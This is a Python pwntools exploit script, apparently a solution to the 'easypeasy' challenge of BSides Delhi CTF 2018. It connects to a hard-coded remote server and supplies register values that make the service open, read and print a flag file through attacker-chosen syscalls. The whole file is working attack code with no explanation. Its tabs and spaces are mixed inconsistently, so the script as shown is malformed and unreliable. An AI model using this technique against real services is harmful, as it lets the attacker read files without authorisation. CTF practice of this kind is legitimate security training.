#!/usr/bin/python

from pwn import *

LOCAL = False

def pwn():
	      log.info("easypeasy - BSides Delhi CTF 2018 - mphx2\n\n")

	      log.info("opening...")
        target.sendlineafter("RAX: ", str(0x2))
        target.sendlineafter("RDI: ", str(0x6010c0))
        target.sendlineafter("RSI: ", str(0x0))
        target.sendlineafter("RDX: ", str(0x0))
        target.sendlineafter("RCX: ", str(0x6d6f682f2f2f2f2f))
        target.sendlineafter("R8: ", str(0x6570797361652f65))
        target.sendlineafter("R9: ", str(0x67616c662f797361))
	
      	log.info("reading...")
	      target.sendlineafter("RAX: ", str(0x0))
        target.sendlineafter("RDI: ", str(0x3))
        target.sendlineafter("RSI: ", str(0x601500))
        target.sendlineafter("RDX: ", str(0x100))
        target.sendlineafter("RCX: ", str(0x0))
        target.sendlineafter("R8: ", str(0x0))
        target.sendlineafter("R9: ", str(0x0))

      	log.info("writing...")
        target.sendlineafter("RAX: ", str(0x1))
	      target.sendlineafter("RDI: ", str(0x1))
        target.sendlineafter("RSI: ", str(0x601500))
        target.sendlineafter("RDX: ", str(0x100))
        target.sendlineafter("RCX: ", str(0x0))
        target.sendlineafter("R8: ",  str(0x0))
        target.sendlineafter("R9: ",  str(0x0))

      	print target.recv()

 	      log.info("closing...")
	      target.sendlineafter("RAX: ", str(0x3c))
        target.sendlineafter("RDI: ", str(0x1))
        target.sendlineafter("RSI: ", str(0x0))
        target.sendlineafter("RDX: ", str(0x0))
        target.sendlineafter("RCX: ", str(0x0))
        target.sendlineafter("R8: ", str(0x0))
        target.sendlineafter("R9: ", str(0x0))

def main():
        global target
        if LOCAL:
                target = process("./easypeasy")
        else:
                target = remote("35.200.228.122", 1337)
        pwn()

if __name__ == "__main__":
    main()
